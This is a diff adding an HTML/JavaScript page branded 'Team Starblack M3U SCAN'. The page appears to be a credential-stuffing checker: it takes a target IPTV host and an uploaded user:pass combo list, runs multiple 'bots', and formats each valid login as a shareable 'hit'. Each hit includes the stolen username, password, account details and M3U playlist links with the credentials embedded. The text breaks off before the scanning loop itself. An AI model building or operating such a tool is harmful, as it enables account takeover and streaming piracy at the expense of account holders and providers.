@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Team Starblack SCAN</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <style>
+    :root {
+      --neon-red: #ff0000;
+      --dark-bg: #0d0d0d;
+      --light-text: #eee;
+      --border-red: #990000;
+    }
+    body {
+      background-color: var(--dark-bg);
+      color: var(--light-text);
+      font-family: monospace;
+      padding: 20px;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+    .image-container {
+      margin-bottom: 15px; /* Adjusted margin */
+      padding: 20px;
+      border-radius: 12px;
+      border: 1px solid var(--neon-red);
+      background-color: #1a1a1a;
+      box-shadow: 0 0 7px var(--neon-red), 0 0 15px var(--neon-red), 0 0 25px var(--neon-red), inset 0 0 10px rgba(255,0,0,0.5);
+      text-align: center;
+    }
+    .image-container img {
+      max-width: 100%;
+      height: auto;
+      display: block;
+      border-radius: 8px;
+    }
+    .glam-heading {
+      font-weight: bold;
+      text-transform: uppercase;
+      color: var(--light-text);
+      text-shadow: 0 0 5px var(--neon-red), 0 0 10px var(--neon-red), 0 0 15px var(--neon-red);
+      letter-spacing: 2px;
+      font-size: clamp(1.5rem, 4vw, 2.5rem);
+    }
+    .top-heading {
+      margin-bottom: 15px;
+    }
+    .bottom-heading {
+      margin-top: 15px;
+      font-size: clamp(1.2rem, 3.5vw, 2.2rem);
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+    input, select, button, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 8px;
+      border: 1px solid var(--border-red);
+      font-size: 16px;
+      font-family: monospace;
+      box-sizing: border-box;
+      background-color: #222;
+      color: var(--light-text);
+    }
+    button {
+      background-color: var(--neon-red);
+      color: #fff;
+      cursor: pointer;
+      margin-top: 10px;
+      font-weight: bold;
+      transition: background-color 0.3s, box-shadow 0.3s;
+      border: none;
+      text-shadow: 0 0 2px #fff;
+      box-shadow: 0 0 5px var(--neon-red), 0 0 10px var(--neon-red);
+    }
+    button:hover:not(:disabled) {
+      background-color: #ff4d4d;
+      box-shadow: 0 0 8px var(--neon-red), 0 0 16px var(--neon-red), 0 0 24px var(--neon-red);
+    }
+    button.utility-btn {
+        background-color: #333;
+        box-shadow: none;
+        margin-bottom: 10px;
+    }
+    button.utility-btn:hover {
+        background-color: #555;
+        box-shadow: none;
+    }
+    button:disabled {
+      background-color: #555 !important;
+      cursor: default;
+      color: #aaa;
+      box-shadow: none;
+    }
+    .box {
+      border: 1px solid var(--neon-red);
+      padding: 15px;
+      border-radius: 12px;
+      margin-bottom: 15px;
+      background-color: #1a1a1a;
+      box-shadow: 0 0 7px var(--neon-red), 0 0 15px var(--neon-red), 0 0 25px var(--neon-red), inset 0 0 10px rgba(255,0,0,0.5);
+    }
+    .progress-line {
+        display: block;
+        margin-bottom: 5px;
+    }
+    .join-box {
+        padding: 5px;
+        text-align: center;
+    }
+    .join-box a {
+        color: var(--light-text);
+        text-decoration: none;
+        font-weight: bold;
+        font-size: 1.2em;
+        text-shadow: 0 0 5px #00aaff, 0 0 10px #00aaff;
+    }
+    #resultado {
+      background-color: #000;
+      color: #ffc4c4;
+      padding: 10px;
+      border-radius: 10px;
+      max-height: 400px;
+      overflow-y: auto;
+      font-size: 13px;
+      margin-top: 15px;
+      white-space: pre-wrap;
+      border: 1px solid #444;
+    }
+    .hit-block {
+      background-color: #2a2a2a;
+      border: 1px solid var(--neon-red);
+      border-radius: 8px;
+      padding: 8px;
+      margin-bottom: 6px;
+      font-size: 13px;
+      color: #ffc4c4;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      position: relative;
+    }
+    .hit-buttons {
+      margin-bottom: 10px;
+      display: flex;
+      gap: 6px;
+      flex-wrap: nowrap;
+      justify-content: flex-end;
+    }
+    .hit-buttons button {
+      background-color: var(--neon-red);
+      color: #fff;
+      border: none;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: bold;
+      cursor: pointer;
+      user-select: none;
+      transition: background-color 0.3s;
+      flex-shrink: 0;
+      min-width: 60px;
+      text-align: center;
+      box-shadow: none;
+    }
+    .hit-buttons button:hover {
+      background-color: #ff4d4d;
+    }
+    .emoji-select {
+      width: 100%;
+      margin-top: 5px;
+      margin-bottom: 10px;
+      font-size: 18px;
+      background-color: #222;
+      color: var(--light-text);
+      border: 1px solid var(--border-red);
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .flex-row {
+      display: flex;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+    .flex-col {
+      flex: 1;
+      min-width: 120px;
+    }
+    footer {
+        display: none;
+    }
+    @media (max-width: 600px) {
+      h2 { font-size: 18px; }
+      input, select, button, textarea { font-size: 14px; }
+      .hit-buttons {
+        flex-direction: row;
+        justify-content: flex-end;
+      }
+      .hit-buttons button {
+        min-width: 50px;
+        padding: 3px 6px;
+        font-size: 11px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="image-container">
+  <a href="https://t.me/abelito_12" target="_blank">
+    <img src="https://i.postimg.cc/KYnqNMyP/team-starblack.jpg" alt="Telegram Channel Link">
+  </a>
+  <h2 class="glam-heading bottom-heading">Team Starblack<br>M3U SCAN</h2>
+  
+  <hr style="border-color: var(--border-red); margin: 20px 0;">
+
+  <div style="text-align: left;">
+    <label for="nick">NICKNAME</label>
+    <input type="text" id="nick" value="@hacker056">
+
+    <label for="host">HOST     (example.com:80) </label>
+    <input type="text" id="host">
+
+    <label for="comboFile">USER:PASS COMBO</label>
+    <input type="file" id="comboFile" accept=".txt">
+
+    <label for="numBots">BOTS   (1-100 Recomendado 20)</label>
+    <input type="number" id="numBots" value="20" min="1" max="100">
+  </div>
+</div>
+
+<div class="box">
+  <h3>CONFIGURA TU PROPIA IMPRESIÓN DE SALIDA</h3>
+  <button class="utility-btn" onclick="randomizeEmojis()">🎲 ALEATORIO EMOJIS</button>
+
+  <div class="flex-row">
+    <div class="flex-col">
+      <label>★ ENCABEZADO</label>
+      <select id="emojiHeader" class="emoji-select">
+          <option>★</option><option>★</option><option>✪</option><option>♕</option><option>♖</option>
+      </select>
+    </div>
+    <div class="flex-col">
+      <label>🎯 HIT</label>
+      <select id="emojiHitsPor" class="emoji-select">
+          <option>🎯</option><option>🔥</option><option>💥</option><option>🥊</option><option>💣</option>
+      </select>
+    </div>
+  </div>
+  <div class="flex-row">
+    <div class="flex-col">
+      <label>🌐 HOST</label>
+      <select id="emojiServidor" class="emoji-select">
+        <option>🌐</option><option>🗺️</option><option>🌎</option><option>🛰️</option><option>📍</option>
+      </select>
+    </div>
+    <div class="flex-col">
+        <label>📡 REAL SERVER</label>
+        <select id="emojiRealServer" class="emoji-select">
+            <option>📡</option><option>🔭</option><option>🌑</option><option>🛰️</option><option>🪐</option>
+        </select>
+    </div>
+  </div>
+  <div class="flex-row">
+      <div class="flex-col">
+        <label>📖 PROTOCOL</label>
+        <select id="emojiProtocol" class="emoji-select">
+            <option>📖</option><option>📜</option><option>📑</option><option>📝</option><option>📃</option>
+        </select>
+    </div>
+    <div class="flex-col">
+        <label>🌍 UBICACIÓN</label>
+        <select id="emojiLocation" class="emoji-select">
+            <option>🌍</option><option>📍</option><option>🗺️</option><option>🧭</option><option>🏠</option>
+        </select>
+    </div>
+  </div>
+  <div class="flex-row">
+    <div class="flex-col">
+      <label>🤴 USUARIO</label>
+      <select id="emojiUsuario" class="emoji-select">
+        <option>🤴</option><option>👻</option><option>🙍‍♂️</option><option>🙍‍♀️</option><option>👻</option>
+      </select>
+    </div>
+    <div class="flex-col">
+      <label>🔐 CONTRASEÑA</label>
+      <select id="emojiSenha" class="emoji-select">
+        <option>🔐</option><option>🔑</option><option>🗝️</option><option>🛡️</option><option>🔏</option>
+      </select>
+    </div>
+  </div>
+  <div class="flex-row">
+    <div class="flex-col">
+      <label>🗓️ CREADA</label>
+      <select id="emojiCriada" class="emoji-select">
+        <option>🗓️</option><option>📆</option><option>💵</option><option>💴</option><option>🕰️</option>
+      </select>
+    </div>
+    <div class="flex-col">
+      <label>📆 FIN</label>
+      <select id="emojiExpira" class="emoji-select">
+        <option>📆</option><option>⏰</option><option>🪦</option><option>☠️</option><option>💀</option>
+      </select>
+    </div>
+  </div>
+  <div class="flex-row">
+      <div class="flex-col">
+        <label>⏳ DURACIÓN</label>
+        <select id="emojiDuration" class="emoji-select">
+            <option>⏳</option><option>🪫</option><option>⏱️</option><option>⌛</option><option>⚠️</option>
+        </select>
+    </div>
+    <div class="flex-col">
+        <label>🔋 ESTADO</label>
+        <select id="emojiStatus" class="emoji-select">
+            <option>🔋</option><option>✔️</option><option>⁉️</option><option>💲</option><option>🆗️</option>
+        </select>
+    </div>
+  </div>
+  <div class="flex-row">
+    <div class="flex-col">
+      <label>🧮 MÁXIMAS CONEXIONES</label>
+      <select id="emojiConexoes" class="emoji-select">
+        <option>🧮</option><option>🔢</option><option>👨‍👩‍👧‍👦</option><option>🧑‍🧑‍🧒‍🧒</option><option>💯</option>
+      </select>
+    </div>
+    <div class="flex-col">
+      <label>👪 CONEXIONES ACTIVAS</label>
+      <select id="emojiConectados" class="emoji-select">
+        <option>👪</option><option>👥</option><option>🤼‍♀️</option><option>🏋‍♀️</option><option>🏃</option>
+      </select>
+    </div>
+  </div>
+  <div class="flex-row">
+    <div class="flex-col">
+      <label>⏲️ TRIAL</label>
+      <select id="emojiTrial" class="emoji-select">
+          <option>⏲️</option><option>🕠</option><option>🪂</option><option>🛸</option><option>🃏</option>
+      </select>
+    </div>
+    <div class="flex-col">
+        <label>🕰️ ZONA HORARIA</label>
+        <select id="emojiTimezone" class="emoji-select">
+            <option>🕰️</option><option>🏳️‍🌈</option><option>⏱️</option><option>🛸</option><option>🪧</option>
+        </select>
+    </div>
+  </div>
+   <div class="flex-row">
+    <div class="flex-col">
+        <label>✍️ MENSAJE</label>
+        <select id="emojiMessage" class="emoji-select">
+          <option>✍️</option><option>💬</option><option>📝</option><option>📢</option><option>✉️</option>
+        </select>
+    </div>
+    <div class="flex-col">
+        <label>🔗 M3U LINK</label>
+        <select id="emojiLinkM3U" class="emoji-select">
+            <option>🔗</option><option>📎</option><option>⛓️</option><option>🧬</option><option>♻️</option>
+        </select>
+    </div>
+  </div>
+   <div class="flex-row">
+    <div class="flex-col">
+        <label>⛓️ REAL M3U LINK</label>
+        <select id="emojiRealM3U" class="emoji-select">
+            <option>⛓️</option><option>🖇</option><option>📡</option><option>🧬</option><option>⛓️‍💥</option>
+        </select>
+    </div>
+    <div class="flex-col">
+        <label>📑 EPG LINK</label>
+        <select id="emojiEpgLink" class="emoji-select">
+            <option>📑</option><option>📜</option><option>📃</option><option>📋</option><option>🗃</option>
+        </select>
+    </div>
+  </div>
+  
+  <hr style="border-color: var(--border-red); margin: 20px 0;">
+  
+  <div class="flex-row">
+    <div class="flex-col" style="min-width: 95%;">
+        <label>CATEGORÍAS</label>
+        <select id="printCategories" class="emoji-select">
+            <option value="true">VER CATEGORÍAS</option>
+            <option value="false">NO VER CATEGORÍAS</option>
+        </select>
+    </div>
+  </div>
+  <div class="flex-row">
+    <div class="flex-col">
+        <label>📺 CANALES</label>
+        <select id="emojiChannels" class="emoji-select">
+            <option>📺</option><option>📡</option><option>💻</option><option>📲</option><option>🔍</option>
+        </select>
+    </div>
+    <div class="flex-col">
+        <label>🎬 PELICULAS</label>
+        <select id="emojiMovies" class="emoji-select">
+            <option>🎬</option><option>🍿</option><option>📽</option><option>📼</option><option>🥤</option>
+        </select>
+    </div>
+  </div>
+  <div class="flex-row">
+     <div class="flex-col">
+        <label>🎞️ SERIES</label>
+        <select id="emojiSeries" class="emoji-select">
+            <option>🎞️</option><option>📹</option><option>🖥</option><option>🎥</option><option>🔎</option>
+        </select>
+    </div>
+    <div class="flex-col">
+        <label>📺 DIVISIÓN DE CANALES</label>
+        <select id="channelSeparator" class="emoji-select">
+            <option>«[⚽️]» </option><option>«[🏀]» </option><option>«[🏈]» </option><option>«[⚾️]» </option><option>«[🥎]» </option>
+        </select>
+    </div>
+  </div>
+   <div class="flex-row">
+    <div class="flex-col">
+        <label>🍿 MOVIE SPLIT</label>
+        <select id="movieSeparator" class="emoji-select">
+            <option>«[🍿]» </option><option>«[📽]» </option><option>«[🥤]» </option><option>«[🎬]» </option><option>«[🖥]» </option>
+        </select>
+    </div>
+     <div class="flex-col">
+        <label>📹 SERIES SPLIT</label>
+        <select id="seriesSeparator" class="emoji-select">
+            <option>«[📹]» </option><option>«[📼]» </option><option>«[📺]» </option><option>«[🎞]» </option><option>«[💻]» </option>
+        </select>
+    </div>
+  </div>
+
+  <hr style="border-color: var(--border-red); margin: 20px 0;">
+
+  <div>
+    <label>⛓️ TELEGRAM LINK </label>
+    <input type="text" id="canalGrupoLink" value="">
+    <label>📬 TELEGRAM EMOJI </label>
+    <select id="emojiCanalGrupo" class="emoji-select">
+      <option>📬</option><option>📨</option><option>📮</option><option>📧</option><option>🗳️</option>
+    </select>
+  </div>
+</div>
+
+<div class="box">
+  <b>📊 SCAN PROGRESS </b><br>
+  <span class="progress-line"><br>🔆 TESTED ➠ <span id="testados">0</span> / <span id="total">0</span></span>
+  <span class="progress-line">✅ HITS ➠ <span id="hits">0</span></span>
+  <span class="progress-line">⛔ BAD ➠ <span id="invalidos">0</span></span>
+  <b><br>BY @hacker056</b><br>
+</div>
+
+<div class="box">
+  <button id="startBtn" onclick="iniciarScan()">INICIAR SCANEO</button>
+  <button id="stopBtn" onclick="pararScan()" disabled="">DETENER</button>
+  <button onclick="enviarTodosHits()">GUARDAR</button>
+</div>
+
+<div class="box join-box">
+    <a href="https://wa.me/18092165652?text=estoy%20interesado%20en%20tu%20checker%20de%20iptv" target="_blank">
+        💙💛 WHATSAAP💛💙
+    </a>
+</div>
+
+<div class="box join-box">
+    <a href="https://whatsapp.com/channel/0029VaAMgko05MUW81inJV04" target="_blank">
+        CANAL WHATSAAP
+    </a>
+</div>
+
+<footer></footer>
+
+<script>
+let todosHits = [];
+let ultimoHit = '';
+let scanParado = true;
+let scanSettings = {};
+
+const timezoneToCountryCode={"Europe/Andorra":"AD","Asia/Dubai":"AE","Asia/Kabul":"AF","America/Antigua":"AG","America/Anguilla":"AI","Europe/Tirane":"AL","Asia/Yerevan":"AM","Africa/Luanda":"AO","Antarctica/McMurdo":"AQ","America/Argentina/Buenos_Aires":"AR","Pacific/Pago_Pago":"AS","Europe/Vienna":"AT","Australia/Sydney":"AU","America/Aruba":"AW","Europe/Mariehamn":"AX","Asia/Baku":"AZ","Europe/Sarajevo":"BA","America/Barbados":"BB","Asia/Dhaka":"BD","Europe/Brussels":"BE","Africa/Ouagadougou":"BF","Europe/Sofia":"BG","Asia/Bahrain":"BH","Africa/Bujumbura":"BI","Africa/Porto-Novo":"BJ","America/St_Barthelmy":"BL","Atlantic/Bermuda":"BM","Asia/Brunei":"BN","America/La_Paz":"BO","America/Noronha":"BR","America/Nassau":"BS","Asia/Thimphu":"BT","Africa/Gaborone":"BW","Europe/Minsk":"BY","America/Belize":"BZ","America/Toronto":"CA","Indian/Cocos":"CC","Africa/Kinshasa":"CD","Africa/Bangui":"CF","Africa/Brazzaville":"CG","Europe/Zurich":"CH","Africa/Abidjan":"CI","Pacific/Rarotonga":"CK","America/Santiago":"CL","Africa/Douala":"CM","Asia/Shanghai":"CN","America/Bogota":"CO","America/Costa_Rica":"CR","America/Havana":"CU","Atlantic/Cape_Verde":"CV","America/Curacao":"CW","Indian/Christmas":"CX","Asia/Nicosia":"CY","Europe/Prague":"CZ","Europe/Berlin":"DE","Africa/Djibouti":"DJ","Europe/Copenhagen":"DK","America/Dominica":"DM","America/Santo_Domingo":"DO","Africa/Algiers":"DZ","America/Guayaquil":"EC","Europe/Tallinn":"EE","Africa/Cairo":"EG","Africa/Asmara":"ER","Europe/Madrid":"ES","Africa/Addis_Abeba":"ET","Europe/Helsinki":"FI","Pacific/Fiji":"FJ","Atlantic/Stanley":"FK","Pacific/Chuuk":"FM","Atlantic/Faroe":"FO","Europe/Paris":"FR","Africa/Libreville":"GA","Europe/London":"GB","America/Grenada":"GD","Asia/Tbilisi":"GE","America/Cayenne":"GF","Europe/Guernsey":"GG","Africa/Accra":"GH","Europe/Gibraltar":"GI","America/Godthab":"GL","Africa/Banjul":"GM","Africa/Conakry":"GN","America/Guadeloupe":"GP","Africa/Malabo":"GQ","Europe/Athens":"GR","Atlantic/South_Georgia":"GS","America/Guatemala":"GT","Pacific/Guam":"GU","Africa/Bissau":"GW","America/Guyana":"GY","Asia/Hong_Kong":"HK","America/Tegucigalpa":"HN","Europe/Zagreb":"HR","America/Port-au-Prince":"HT","Europe/Budapest":"HU","Asia/Jakarta":"ID","Europe/Dublin":"IE","Asia/Jerusalem":"IL","Europe/Isle_of_Man":"IM","Asia/Kolkata":"IN","Indian/Chagos":"IO","Asia/Baghdad":"IQ","Asia/Tehran":"IR","Atlantic/Reykjavik":"IS","Europe/Rome":"IT","Europe/Jersey":"JE","America/Jamaica":"JM","Asia/Amman":"JO","Asia/Tokyo":"JP","Africa/Nairobi":"KE","Asia/Bishkek":"KG","Asia/Phnom_Penh":"KH","Pacific/Tarawa":"KI","Indian/Comoro":"KM","America/St_Kitts":"KN","Asia/Pyongyang":"KP","Asia/Seoul":"KR","Asia/Kuwait":"KW","America/Cayman":"KY","Asia/Almaty":"KZ","Asia/Vientiane":"LA","Asia/Beirut":"LB","America/St_Lucia":"LC","Europe/Vaduz":"LI","Asia/Colombo":"LK","Africa/Monrovia":"LR","Africa/Maseru":"LS","Europe/Vilnius":"LT","Europe/Luxembourg":"LU","Europe/Riga":"LV","Africa/Tripoli":"LY","Africa/Casablanca":"MA","Europe/Monaco":"MC","Europe/Chisinau":"MD","Europe/Podgorica":"ME","America/Marigot":"MF","Indian/Antananarivo":"MG","Pacific/Majuro":"MH","Europe/Skopje":"MK","Africa/Bamako":"ML","Asia/Yangon":"MM","Asia/Ulaanbaatar":"MN","Asia/Macau":"MO","Pacific/Saipan":"MP","America/Martinique":"MQ","Africa/Nouakchott":"MR","America/Montserrat":"MS","Europe/Malta":"MT","Indian/Mauritius":"MU","Indian/Maldives":"MV","Africa/Blantyre":"MW","America/Mexico_City":"MX","Asia/Kuala_Lur":"MY","Africa/Maputo":"MZ","Africa/Windhoek":"NA","Pacific/Noumea":"NC","Africa/Niamey":"NE","Pacific/Norfolk":"NF","Africa/Lagos":"NG","America/Managua":"NI","Europe/Amsterdam":"NL","Europe/Oslo":"NO","Asia/Kathmandu":"NP","Pacific/Nauru":"NR","Pacific/Niue":"NU","Pacific/Auckland":"NZ","Asia/Muscat":"OM","America/Panama":"PA","America/Lima":"PE","Pacific/Tahiti":"PF","Pacific/Port_Moresby":"PG","Asia/Manila":"PH","Asia/Karachi":"PK","Europe/Warsaw":"PL","America/Miquelon":"PM","Pacific/Pitcairn":"PN","America/Puerto_Rico":"PR","Asia/Gaza":"PS","Europe/Lisbon":"PT","Pacific/Palau":"PW","America/Asuncion":"PY","Asia/Qatar":"QA","Indian/Reunion":"RE","Europe/Bucharest":"RO","Europe/Belgrade":"RS","Europe/Moscow":"RU","Africa/Kigali":"RW","Asia/Riyadh":"SA","Pacific/Guadalcanal":"SB","Indian/Mahe":"SC","Africa/Khartoum":"SD","Europe/Stockholm":"SE","Asia/Singapore":"SG","Atlantic/St_Helena":"SH","Europe/Ljubljana":"SI","Arctic/Longyearbyen":"SJ","Europe/Bratislava":"SK","Africa/Freetown":"SL","Europe/San_Marino":"SM","Africa/Dakar":"SN","Africa/Mogadishu":"SO","America/Paramaribo":"SR","Africa/Juba":"SS","Africa/Sao_Tome":"ST","America/El_Salvador":"SV","America/Lower_Princes":"SX","Asia/Damascus":"SY","Africa/Mbabane":"SZ","America/Grand_Turk":"TC","Africa/Ndjamena":"TD","Indian/Kerguelen":"TF","Africa/Lome":"TG","Asia/Bangkok":"TH","Asia/Dushanbe":"TJ","Pacific/Fakaofo":"TK","Asia/Dili":"TL","Asia/Ashgabat":"TM","Africa/Tunis":"TN","Pacific/Tongatapu":"TO","Europe/Istanbul":"TR","America/Port_of_Spain":"TT","Pacific/Funafuti":"TV","Asia/Taipei":"TW","Africa/Dar_es_Salaam":"TZ","Europe/Kiev":"UA","Africa/Kampala":"UG","America/New_York":"US","America/Montevideo":"UY","Asia/Tashkent":"UZ","Europe/Vatican":"VA","America/St_Vincent":"VC","America/Caracas":"VE","America/Tortola":"VG","America/St_Thomas":"VI","Asia/Ho_Chi_Minh":"VN","Pacific/Efate":"VU","Pacific/Wallis":"WF","Pacific/Apia":"WS","Asia/Aden":"YE","Indian/Mayotte":"YT","Africa/Johannesburg":"ZA","Africa/Lusaka":"ZM","Africa/Harare":"ZW"};
+function getFlagFromTimezone(timezone){if(!timezone)return{flag:"❓",code:"N/A"};const countryCode=timezoneToCountryCode[timezone];if(!countryCode)return{flag:"❓",code:"N/A"};const flag=countryCode.toUpperCase().split("").map(char=>String.fromCodePoint(char.charCodeAt(0)+127397)).join("");return{flag,code:countryCode}}
+
+function randomizeEmojis() {
+    const selectors = document.querySelectorAll('.emoji-select');
+    selectors.forEach(select => {
+        if(select.id === 'printCategories') return;
+        const randomIndex = Math.floor(Math.random() * select.options.length);
+        if (select.id === 'emojiEpgLink' && select.options[randomIndex].value === '') {
+            select.selectedIndex = 1; 
+        } else {
+            select.selectedIndex = randomIndex;
+        }
+    });
+}
+
+function atualizarStatus(testados, total, hits, invalidos){document.getElementById("testados").textContent=testados;document.getElementById("total").textContent=total;document.getElementById("hits").textContent=hits;document.getElementById("invalidos").textContent=invalidos}
+function desabilitarBotoes(scanAtivo){document.getElementById("startBtn").disabled=scanAtivo;document.getElementById("stopBtn").disabled=!scanAtivo}
+function limparHost(host){return host.replace(/^https?:\/\//i,"").trim()}
+async function fetchComTimeout(resource,options={}){const{timeout:timeout=8e3}=options;const controller=new AbortController;const id=setTimeout(()=>controller.abort(),timeout);try{const response=await fetch(resource,{...options,signal:controller.signal});return clearTimeout(id),response}catch(e){throw clearTimeout(id),e}}
+
+function formatCreatedDate(unix) {
+    if (!unix || isNaN(unix) || unix == 0) return 'None';
+    const d = new Date(unix * 1000);
+    const day = ('0' + d.getDate()).slice(-2);
+    const month = ('0' + (d.getMonth() + 1)).slice(-2);
+    const year = d.getFullYear();
+    return `${day}.${month}.${year}`;
+}
+
+async function getGeoLocation(hostOrIp) {
+    try {
+        const response = await fetchComTimeout(`http://ip-api.com/json/${hostOrIp}?fields=status,country,countryCode,city`);
+        const data = await response.json();
+        if (data.status === 'success') {
+            return data;
+        }
+        return { country: 'N/A', city: 'N/A', countryCode: 'N/A' };
+    } catch (e) {
+        return { country: 'N/A', city: 'N/A', countryCode: 'N/A' };
+    }
+}
+
+function formatarHit(info, host, user, pass, nick, emojis, config, geoLocation) {
+    let timezoneText;
+    if (!info.timezone || info.timezone.toUpperCase() === 'UTC') {
+        timezoneText = `UTC 🏴‍☠️`;
+    } else {
+        const { flag, code } = getFlagFromTimezone(info.timezone);
+        timezoneText = `${info.timezone} ${flag} [${code}]`;
+    }
+
+    let locationText = 'N/A';
+    if (geoLocation.countryCode && geoLocation.countryCode !== 'N/A') {
+        const flag = geoLocation.countryCode.toUpperCase().split('').map(char => String.fromCodePoint(char.charCodeAt(0) + 127397)).join('');
+        locationText = `${geoLocation.country}/${geoLocation.city} ${flag} [${geoLocation.countryCode}]`;
+    }
+
+    const messageText = info.message && info.message.trim() !== '' ? info.message : 'IPTV FOR FREE!';
+    const realServerUrl = `http://${info.server_info.url}:${info.server_info.port}`;
+    
+    let endsLine = '';
+    let durationLine = '';
+
+    if (!info.exp_date || isNaN(info.exp_date) || info.exp_date == 0) {
+        endsLine = `${emojis.expira} E𝙽𝙳𝚂 ➠ «[🤴UNLIMITED🤴]»`;
+    } else {
+        const formattedEndDate = new Date(info.exp_date * 1000).toLocaleDateString('en-GB', {
+            day: 'numeric',
+            month: 'long',
+            year: 'numeric'
+        });
+        endsLine = `${emojis.expira} E𝙽𝙳𝚂 ➠ ${formattedEndDate}`;
+
+        const now = new Date();
+        const expiryDate = new Date(info.exp_date * 1000);
+        const diffTime = expiryDate - now;
+        const daysLeft = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+        durationLine = `\n${emojis.emojiDuration} D𝚄𝚁𝙰𝚃𝙸𝙾𝙽 ➠ ${Math.max(0, daysLeft)} [D𝙰𝚈𝚂]`;
+    }
+
+    let categoryText = "";
+    if (config.printCategories) {
+        const formatCategoryList = (titleEmoji, title, list, separator, notFoundMsg) => {
+            const cleanSeparator = separator.trim();
+            if (!list || list.length === 0) {
+                return `\n${titleEmoji} ${title}\n${cleanSeparator} ${notFoundMsg} ${cleanSeparator}`;
+            }
+            const names = list.map(c => c.category_name.toUpperCase()).join(` ${cleanSeparator} `);
+            return `\n${titleEmoji} ${title}\n${cleanSeparator} ${names} ${cleanSeparator}`;
+        };
+        categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiChannels, "𝐂𝐀𝐍𝐀𝐋 ➠ ", info.live_categories, config.channelSeparator, "NO CHANNELS FOUND");
+        categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiMovies, "𝐌𝐎𝐕𝐈𝐄𝐒 ➠ ", info.vod_categories, config.movieSeparator, "NO MOVIES FOUND");
+        categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiSeries, "𝐒𝐄𝐑𝐈𝐄𝐒 ➠ ", info.series_categories, config.seriesSeparator, "NO SERIES FOUND");
+    } else {
+        const cleanChannelSep = config.channelSeparator.trim();
+        const cleanMovieSep = config.movieSeparator.trim();
+        const cleanSeriesSep = config.seriesSeparator.trim();
+        categoryText = `\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiChannels} 𝐂𝐀𝐍𝐀𝐋 ➠ \n${cleanChannelSep} H I D D E N ${cleanChannelSep}\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiMovies} 𝐌𝐎𝐕𝐈𝐄𝐒 ➠ \n${cleanMovieSep} H I D D E N ${cleanMovieSep}\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiSeries} 𝐒𝐄𝐑𝐈𝐄𝐒 ➠ \n${cleanSeriesSep} H I D D E N ${cleanSeriesSep}`;
+    }
+    
+    const now = new Date();
+    const dateString = now.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
+    const timeString = now.toTimeString().slice(0, 5);
+    const footer = `\n━━━━━━━━━━━━━━━━━━━━\n📆 D𝙰𝚃𝙴 ➠ ${dateString}\n⏰️ T𝙸𝙼𝙴 ➠ ${timeString}\n⌨️ B𝚈 ➠ @hacker056\n👀 GRUPO ➠ Team Stablack\n${config.emojiCanal} VISITA EL CANAL(${config.canalLink||"https://whatsapp.com/channel/0029VaAMgko05MUW81inJV04"})\n━━━━━━━━━━━━━━━━━━━━\nTeam Stablack 𝚂𝙲𝙰𝙽\n━━━━━━━━━━━━━━━━━━━━`;
+
+    let texto = 
+`━━━━━━━━━━━━━━━━━━━━
+[${emojis.emojiHeader}] Team Starblack Scan [${emojis.emojiHeader}]
+━━━━━━━━━━━━━━━━━━━━
+${emojis.servidor} H𝙾𝚂𝚃 ➠ http://${host}
+${emojis.emojiRealServer} R𝙴𝙰𝙻 ➠ ${realServerUrl}
+${emojis.emojiProtocol} P𝚁𝙾𝚃𝙾𝙲𝙾𝙻 ➠ http
+${emojis.emojiLocation} UBICACIÓN ➠ ${locationText}
+${emojis.criada} C𝚁𝙴𝙰𝙳A ➠ ${formatCreatedDate(info.created_at)}
+${endsLine}${durationLine}
+${emojis.usuario} USUARIO ➠ ${user}
+${emojis.senha} CONTRASEÑA ➠ ${pass}
+${emojis.emojiTrial} T𝚁𝙸𝙰𝙻 ➠ [${info.is_trial == 1 ? "YES" : "NO"}]
+${emojis.status} ESTADO ➠ ${info.status ? info.status.toUpperCase() : "INACTIVE"}
+${emojis.conexoes} MAXIMA CONEXIONES ➠ [${info.max_connections || "N/A"}]
+${emojis.conectados} CONEXIONES ACTIVAS ➠ [${info.active_cons || "0"}]
+${emojis.emojiTimezone} ZONA HORARIA ➠ ${timezoneText}
+${emojis.emojiMessage} MENSAJE ➠ ${messageText}
+${emojis.hitsPor} H𝙸𝚃𝚂 B𝚈 ➠ ${nick}
+━━━━━━━━━━━━━━━━━━━━
+${emojis.linkM3U} H𝙾𝚂𝚃 M𝟹𝚄 ➠ [G𝙴𝚃 H𝙾𝚂𝚃 M𝟹𝚄](http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus)
+${emojis.emojiRealM3U} R𝙴𝙰𝙻 M𝟹𝚄 ➠ [G𝙴𝚃 R𝙴𝙰𝙻 M𝟹𝚄](${realServerUrl}/get.php?username=${user}&password=${pass}&type=m3u_plus)
+${emojis.emojiEpgLink} E𝙿𝙶 L𝙸𝙽𝙺 ➠ [G𝙴𝚃 E𝙿𝙶 L𝙸𝙽𝙺](http://${host}/xmltv.php?username=${user}&password=${pass})
+━━━━━━━━━━━━━━━━━━━━
+${emojis.emojiChannels} T𝙾𝚃𝙰𝙻 CANALES ➠ [${info.live_streams_count || 0}]
+${emojis.emojiMovies} T𝙾𝚃𝙰𝙻 PELICULAS ➠ [${info.vod_streams_count || 0}]
+${emojis.emojiSeries} T𝙾𝚃𝙰𝙻 S𝙴𝚁𝙸𝙴𝚂 ➠ [${info.series_count || 0}]` +
+(categoryText) +
+(footer);
+
+    return texto;
+}
+
+async function mostrarHitNaTela(hit) {
+    let divResultado = document.getElementById('resultado');
